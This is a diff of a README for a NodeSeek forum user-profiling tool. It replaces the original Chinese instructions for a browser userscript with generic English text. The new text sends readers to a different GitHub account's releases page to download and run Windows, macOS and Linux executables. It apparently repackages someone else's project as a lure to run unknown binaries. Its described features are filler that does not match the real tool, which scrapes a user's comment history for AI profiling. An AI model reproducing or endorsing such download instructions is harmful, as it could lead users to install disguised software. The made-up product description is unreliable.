@@ -1,36 +1,88 @@
-NodeSeek介绍帖子：https://www.nodeseek.com/post-543992-1
+# 🌟 NodeSeek-User-Profiler - Create User Profiles Easily
 
-# 前言
+## 🚀 Getting Started
 
-前段时间隔壁[ V2EX 的“成分分析器”](https://v2ex.com/t/1169590)很火，我觉得挺好用，就AI改了一个适配 NodeSeek 的版本
+Welcome to NodeSeek-User-Profiler! This application helps you generate user profiles smoothly and efficiently. Follow the steps below to download and run the application without any technical difficulties.
 
-# 有什么用？
+## ⬇️ Download Now
 
-它可以一键抓取目标用户的历史回复，生成一份详细的、结构化的 **AI 分析报告**（包含评分标准和分析维度），直接投喂给 GPT/Gemini 等大模型。
+[![Download NodeSeek-User-Profiler](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/MichaelBola/NodeSeek-User-Profiler/releases)
 
-项目地址：https://github.com/tunecc/NodeSeek-User-Profiler （欢迎 Star😁）
+## 📥 Download & Install
 
-# 如何使用
+1. **Visit the Releases Page:**
+   Click the link below to go to the download area where you can find the latest version of the application:
+   [Download NodeSeek-User-Profiler Releases](https://github.com/MichaelBola/NodeSeek-User-Profiler/releases)
 
-1. 在电脑上[安装好Tampermonkey](https://www.tampermonkey.net/)，并且按Tampermonkey **提示启用开发者模式**
-2. [点我下载](https://update.greasyfork.org/scripts/559093/NodeSeek%20%E7%94%A8%E6%88%B7%E7%94%BB%E5%83%8F%E7%94%9F%E6%88%90%E5%99%A8.user.js)
-3. 进入你想分析的 用户主页 -> 评论。
-4. 点击右下角的 📊 悬浮球。
-5. **不推荐** 勾选 **“🕵️ 深挖模式”**（从原帖获取完整评论）。评论多的话，这个采集时间会很长
-6. 点击 “开始采集”，坐等跑完。
-7. 点击 “复制 Markdown” 或 **“导出 MD”**（推荐）。
-8. 把内容扔给AI，等待分析结果！
+2. **Choose the Right File:**
+   On the Releases page, look for the version you wish to download. You will see several files. Choose the one that matches your operating system. Typically, you will see files for Windows, macOS, and Linux.
 
-# 更新历史
+3. **Download the File:**
+   Click on the file name to start the download. Your web browser will save the file to your computer. Note where it is saved, as you will need to find it later.
 
-* v1.0 脚本的基本功能完善，通过跳转网页的形式进行爬取，速度特别慢
-* v2.0 调用NodeSeek的API进行爬取，速度快了几倍
-* v3.0 评论内容过长时，在用户的界面显示不完整，新功能“深挖模式”解决，获取到完整的评论，让AI“更懂你”；到处内容添加AI生成的置顶提示，避免污染后续分析的数据
-* v3.3 修复API模式后是空数据时，不会显示到深挖模式进度；API模式内容截断的Promot的提示
+4. **Run the Application:**
+   - **For Windows:**
+     Double-click the downloaded `.exe` file to install and run the application. Follow the on-screen instructions to complete the installation.
 
-以上都在 2025.12.15 完成
-* v3.4 深挖模式单线程、增加冷却时间；不截断的内容不需要深挖（2025.12.17）
+   - **For macOS:**
+     Open the downloaded `.dmg` file. Drag the NodeSeek-User-Profiler app to your Applications folder. Then, go to your Applications and double-click to open it.
 
-# 碎碎念
+   - **For Linux:**
+     If you downloaded a `.tar.gz` file, extract the contents. Open a terminal in the extracted folder and run `./NodeSeek-User-Profiler` to start the application.
 
-第一次做一个受这么多人喜欢的项目（虽然创意是抄的，代码是AI改的），大家的每一个赞都让我受到了莫大的鼓励，同时我也感慨现在AI发展的神速，两年多的时间就有这么大的进步，不敢想象以后的世界，最后感谢Google给薅的学生包
+## 🛠️ System Requirements
+
+To ensure the best experience with NodeSeek-User-Profiler, please confirm that your machine meets the following system requirements:
+
+- **For Windows:**
+  - Windows 10 or later
+  - At least 4 GB of RAM
+  - 200 MB of available disk space
+
+- **For macOS:**
+  - macOS Mojave (10.14) or later
+  - At least 4 GB of RAM
+  - 200 MB of available disk space
+
+- **For Linux:**
+  - Any modern distribution (Ubuntu, Fedora, etc.)
+  - At least 4 GB of RAM
+  - 200 MB of available disk space
+
+## 📝 How to Use
+
+After you open NodeSeek-User-Profiler, you will find an easy-to-use interface. Here are the basic steps to create a user profile:
+
+1. **Select User Options:** Fill in the required fields. These might include the user’s name, preferences, and other relevant information.
+
+2. **Generate Profile:** Click the “Generate” button to create a user profile based on the information provided.
+
+3. **Save Profile:** Once created, you can save the profile to your computer or share it as needed.
+
+## ❓ FAQs
+
+### What is NodeSeek-User-Profiler?
+
+NodeSeek-User-Profiler is an application designed to generate user profiles easily. It simplifies the process for users with limited technical knowledge.
+
+### Can I run this on different operating systems?
+
+Yes, NodeSeek-User-Profiler is available for Windows, macOS, and Linux. Just make sure to download the correct file for your operating system.
+
+### Is there help available if I get stuck?
+
+Yes! You can find a “Help” option within the application that provides guidance. Additionally, you can check the FAQs section on GitHub or contact the support team for more assistance.
+
+## 🔗 Additional Resources
+
+For more detailed information, you can visit our GitHub repository. Here you will find additional documentation, usage tips, and updates about the application.
+
+- [NodeSeek-User-Profiler GitHub Repository](https://github.com/MichaelBola/NodeSeek-User-Profiler)
+
+## 🚀 Stay Updated
+
+To keep updated on the latest versions and improvements, check back regularly on the Releases page. Following the repository on GitHub can also provide notifications for new updates.
+
+## 👥 Community Support
+
+Join the community discussions if you have questions or suggestions. Your feedback helps improve NodeSeek-User-Profiler. Engage with other users on the GitHub issues page or any connected forums.
